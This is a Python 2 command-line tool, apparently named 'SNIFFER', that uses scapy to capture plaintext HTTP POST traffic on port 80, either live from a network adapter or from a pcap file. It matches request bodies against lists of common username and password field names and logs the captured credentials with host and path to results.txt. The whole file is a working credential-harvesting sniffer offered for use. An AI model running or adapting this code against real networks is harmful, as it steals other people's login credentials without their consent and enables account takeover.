# -*-coding:UTF-8-*-
from scapy_http.http import HTTPRequest
from scapy.all import *

import traceback
import argparse
import time
import sys
import os
# import re


# passwd sniffing callback function
def passwd_callback(packet):

    userNamePatternList = ['user', 'username', 'userid', 'useremail', 'mail', 'account', 'txtusername', 'txtusercode', 'textbox1', 'name', 'j_username', 'txtid']
    passwordPatternList = ['pass', 'password', 'txtpassword', 'pwd', 'txtpwd', 'textbox2', 'userpass', 'j_password']

    if HTTPRequest in packet:
        passwd_packet = packet[TCP].payload
        if passwd_packet.Method == 'POST':
            headers, body = str(passwd_packet).split("\r\n\r\n", 1)
            PatternList = userNamePatternList + passwordPatternList

            # results_body = []
            resutls_body = {}
            for pattern in PatternList:         # collecting the pattern
                if pattern in body.lower():
                    # resutls_body.append(body)
                    path = "{0}?".format(passwd_packet.Path) if passwd_packet.Path[-1:] != "?" else passwd_packet.Path
                    link = "http://{0}{1}{2}".format(passwd_packet.Host, path, body)
                    resutls_body[link] = body

            # 列表元素去重
            remove_duplication = list(set(resutls_body))
            # remove_duplication = set(resutls_body)
            for item in remove_duplication:
                print item
                print '-' * 100
                with open('results.txt', 'a') as f:
                    f.write(item)
                    f.write('\n')
                    f.write('-' * 100)
                    f.write('\n')


# exception
def sniff_excetion():
    print 'sniff exception'
    f = open('./log.txt', 'a')
    traceback.print_exc(file=f)
    f.flush()
    f.close()
    return


# live sniffing
def live_sniff(adapter):
    try:
        sniff(iface=adapter, filter='tcp port 80', prn=passwd_callback, store=0, count=1000)
    except:
        sniff_excetion()


# extracting from pcap file
def offline_sniff(packet):
    try:
        sniff(filter='tcp port 80', offline=packet, prn=passwd_callback)
    except:
        sniff_excetion()


def main():

    parser = argparse.ArgumentParser(
        prog='PROG',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=logo()
    )
    parser.add_argument('-l', '--live', help='Sniffing in live', metavar='Adapter')
    parser.add_argument('-o', '--offline', type=file, metavar='File', help='Sniffing offline file')
    parser.add_argument('-v', '--version', help='display the version', action='version', version='%(prog)s 1.0.0')

    args = parser.parse_args()

    if args.live:
        # live sniffing
        try:
            live_sniff(sys.argv[2])
        except:
            print 'Please select the right adapter'
            sys.exit()
    elif args.offline:
        # extracting from pcap file
        try:
            if not os.path.exists(sys.argv[2]):
                parser.error('The file %s does not exist!' % sys.argv[2])
            else:
                offline_sniff(sys.argv[2])
        except:
            print 'Please select the right pcap packet'
            sys.exit()

    print 'wait 2s...'
    time.sleep(2)


# logo
def logo():
    logo = '''\
    ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    ─██████████████─██████──────────██████─██████████─██████████████─██████████████─██████████████─████████████████───
    ─██░░░░░░░░░░██─██░░██████████──██░░██─██░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
    ─██░░██████████─██░░░░░░░░░░██──██░░██─████░░████─██░░██████████─██░░██████████─██░░██████████─██░░████████░░██───
    ─██░░██─────────██░░██████░░██──██░░██───██░░██───██░░██─────────██░░██─────────██░░██─────────██░░██────██░░██───
    ─██░░██████████─██░░██──██░░██──██░░██───██░░██───██░░██████████─██░░██████████─██░░██████████─██░░████████░░██───
    ─██░░░░░░░░░░██─██░░██──██░░██──██░░██───██░░██───██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
    ─██████████░░██─██░░██──██░░██──██░░██───██░░██───██░░██████████─██░░██████████─██░░██████████─██░░██████░░████───
    ─────────██░░██─██░░██──██░░██████░░██───██░░██───██░░██─────────██░░██─────────██░░██─────────██░░██──██░░██─────
    ─██████████░░██─██░░██──██░░░░░░░░░░██─████░░████─██░░██─────────██░░██─────────██░░██████████─██░░██──██░░██████─
    ─██░░░░░░░░░░██─██░░██──██████████░░██─██░░░░░░██─██░░██─────────██░░██─────────██░░░░░░░░░░██─██░░██──██░░░░░░██─
    ─██████████████─██████──────────██████─██████████─██████─────────██████─────────██████████████─██████──██████████─
    '''
    return logo


if __name__ == '__main__':
    main()
